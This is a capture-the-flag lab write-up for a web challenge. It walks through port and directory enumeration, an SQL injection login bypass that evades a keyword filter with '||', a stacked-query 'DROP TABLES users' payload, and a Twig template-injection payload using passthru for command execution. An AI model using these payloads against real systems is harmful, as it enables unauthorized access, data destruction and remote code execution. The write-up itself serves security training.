# Recon
Using this command 
```
nmap -sV -T4 -O -A 10.49.171.59
....
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 5f:dc:93:8d:01:8b:9b:ed:2c:65:da:62:88:55:aa:ea (RSA)
|   256 a7:30:a0:15:63:cb:37:d5:bd:f7:10:1a:47:71:18:41 (ECDSA)
|_  256 22:8b:1a:ad:0c:1e:73:ec:dd:43:92:5a:8f:ef:91:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Injectics Leaderboard
|_http-server-header: Apache/2.4.41 (Ubuntu)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
...
```

So I have port 22 and port 80 are open which inform me that I can access the webpage of the target laterally
Next it is time for the directory enumeration with the following command

```
gobuster dir -u "http://10.49.171.59/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64

...
/flags                (Status: 301) [Size: 312] [--> http://10.49.171.59/flags/]
/css                  (Status: 301) [Size: 310] [--> http://10.49.171.59/css/]
/js                   (Status: 301) [Size: 309] [--> http://10.49.171.59/js/]
/javascript           (Status: 301) [Size: 317] [--> http://10.49.171.59/javascript/]
/vendor               (Status: 301) [Size: 313] [--> http://10.49.171.59/vendor/]
/phpmyadmin           (Status: 301) [Size: 317] [--> http://10.49.171.59/phpmyadmin/]
/server-status        (Status: 403) [Size: 277]
...
```

Look like I have 2 interesting directories right here `/flags` and `/vendor`. Let's enumerate to find their hidden secret folders if possible

`/vendor` first
```
fuf -u http://10.49.171.59/vendor/FUZZ -w /usr/share/wordlists/dirb/big.txt
....
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 217ms]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 216ms]
bin                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 229ms]
composer                [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 196ms]
symfony                 [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 206ms]
twig                    [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 202ms]
....
```

Secondly, `/flags`
```
ffuf -u http://10.49.171.59/flags/FUZZ -w /usr/share/wordlists/dirb/big.txt
...
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 212ms]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 5132ms]
```
Nothing much for this one I guess. However, I still got something inside `/vendor`
Diving more inside `/vendor/composer`

```
ffuf -u http://10.49.171.59/vendor/composer/FUZZ -w /usr/share/wordlists/dirb/big.txt
...
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1095ms]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 3102ms]
LICENSE                 [Status: 200, Size: 1070, Words: 153, Lines: 22, Duration: 216ms]
```

`/vendor/twig`
```
ffuf -u http://10.49.171.59/vendor/twig/FUZZ -w /usr/share/wordlists/dirb/big.txt
...
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 206ms]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 4354ms]
twig                    [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 178ms]

```

For mroe information about `twig` -> Twig is a PHP template engine used to generate dynamic HTML for web applications by separating presentation (HTML) from application logic.
Keep doing recursively into another `/twig`

```
ffuf -u http://10.49.171.59/vendor/twig/twig/FUZZ -w /usr/share/wordlists/dirb/big.txt
...
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 3572ms]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 4597ms]
LICENSE                 [Status: 200, Size: 1513, Words: 244, Lines: 28, Duration: 205ms]
doc                     [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 184ms]
lib                     [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 209ms]
src                     [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 202ms]
```

Inside `doc` 
```
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 408ms]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 4503ms]
filters                 [Status: 301, Size: 335, Words: 20, Lines: 10, Duration: 205ms]
functions               [Status: 301, Size: 337, Words: 20, Lines: 10, Duration: 202ms]
tags                    [Status: 301, Size: 332, Words: 20, Lines: 10, Duration: 210ms]
tests                   [Status: 301, Size: 333, Words: 20, Lines: 10, Duration: 204ms]
```

Nothing left for me to enumerate. Let's have a look at the http page and found interestingly exposed information
<img width="588" height="206" alt="Screenshot_2025-11-30_01-06-38" src="https://github.com/user-attachments/assets/7923104e-d859-4e1d-b58b-d58a91963332" />
<img width="1567" height="754" alt="Screenshot_2025-11-30_02-12-26" src="https://github.com/user-attachments/assets/9da9be3c-348d-4c46-8726-780cffbd4d86" />

Well, the developer team is actually trolling by exposing testing credentials
<img width="1917" height="467" alt="Screenshot_2025-11-30_01-00-54" src="https://github.com/user-attachments/assets/dd7f5594-9c1f-40cc-94fa-f904e3b28a26" />

Now lets try to inject the login portal using this [payload](https://github.com/payloadbox/sql-injection-payload-list/blob/6e55457963a04377b904a93a6a65bb49dfe7bccb/Intruder/exploit/Auth_Bypass.txt) and BurpSuite
<img width="1678" height="189" alt="Screenshot_2025-11-30_02-12-10" src="https://github.com/user-attachments/assets/49c2050d-002f-49ea-ae81-d761ce81b87e" />
<img width="1567" height="754" alt="Screenshot_2025-11-30_02-12-26" src="https://github.com/user-attachments/assets/bb8a92ea-a387-4b16-9dbf-3c9cbddffec4" />

From this, I know that the payload `OR 'x'='x';#` works on this login along with the known credentials aboove. However, I still fail to login somehow which confuse and cause me frustrate a lot, I need to inspect more to understand the filter of the login page.
Again, in the page source

<img width="517" height="61" alt="Screenshot_2025-12-02_01-25-36" src="https://github.com/user-attachments/assets/98de6c67-b6e0-4855-afa1-d69c7d89033e" />

<img width="1027" height="585" alt="Screenshot_2025-12-02_01-25-53" src="https://github.com/user-attachments/assets/ec73f532-3dde-4d7c-881d-259e1c5c32ad" />

So the page has restricted `or`, `'` which are the factors why I always get wrong. So, instead of using `or` I can use `||` and here it is

<img width="1226" height="671" alt="Screenshot_2025-12-02_01-32-25" src="https://github.com/user-attachments/assets/25c54e2d-6766-4217-a08f-bb8d83587139" />

<img width="1919" height="964" alt="Screenshot_2025-12-02_01-32-05" src="https://github.com/user-attachments/assets/827b8b52-8c7a-4436-95bc-01e7a5b30936" />


I need to check this requests for editing the prize table are related to SQL or not. So I modify the table quite a bit and it turns out like this
<img width="1920" height="699" alt="Screenshot_2025-12-02_01-43-53" src="https://github.com/user-attachments/assets/2050d7f9-1be2-47be-bb3d-ee6f9026f8bf" />

So I assume that this editing request is affected by SQL as well
I entered this payload 
```
1;DROP TABLES users -- -
```
inside the gold parameter to drop eliminate all the existing users table which migth potentially help me use the default credentials to get access under admin
Now I attempt to login with default credentials on `mail.log` file again and yess sir I got in


<img width="1920" height="740" alt="Screenshot_2025-12-02_02-22-55" src="https://github.com/user-attachments/assets/451cc830-eac5-47d2-af07-fe912921c013" />

Now it is time to retrieve the second flag, I navigate to the `Profile` section which tells me that I can update my name and it will appear the updated name on the `Home` page
<img width="1918" height="460" alt="Screenshot_2025-12-02_02-31-33" src="https://github.com/user-attachments/assets/df3da771-ca9e-495a-8446-1c9458db2b51" />
<img width="1920" height="731" alt="Screenshot_2025-12-02_02-31-20" src="https://github.com/user-attachments/assets/eb9c77be-18b6-458b-8421-ca823375c209" />

So I can assume that the template will be `Twig` since I attempted to inject `Jinja2` payloads which are useless
Here is the payload
```
{{['id',1]|sort('passthru')}}
```

The reference is this [page](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig)

<img width="1920" height="741" alt="Screenshot_2025-12-02_02-41-00" src="https://github.com/user-attachments/assets/2b5679a5-be1a-4924-a23e-e3b3a9f3e4b7" />


Now let's custom the payload, first I need to find relative information related to where the flag is
<img width="1919" height="766" alt="Screenshot_2025-12-02_02-53-11" src="https://github.com/user-attachments/assets/37e65ecd-661a-4639-82f1-0fd04b994bae" />

<img width="1920" height="454" alt="Screenshot_2025-12-02_02-53-21" src="https://github.com/user-attachments/assets/19fa4865-bc9b-444b-8bc6-96ff39329bc7" />


Then I know that this `flags` is a folder so let's retrieve the flag
<img width="1920" height="463" alt="Screenshot_2025-12-02_02-52-50" src="https://github.com/user-attachments/assets/bb73689b-e08c-4ab2-a3d1-9cb4bad9173d" />

<img width="1920" height="679" alt="Screenshot_2025-12-02_02-52-40" src="https://github.com/user-attachments/assets/6b81c960-ff3e-40ff-8cb9-caf69880b4d0" />

I got the flag and it is done now
Happy Hacking.~~~~
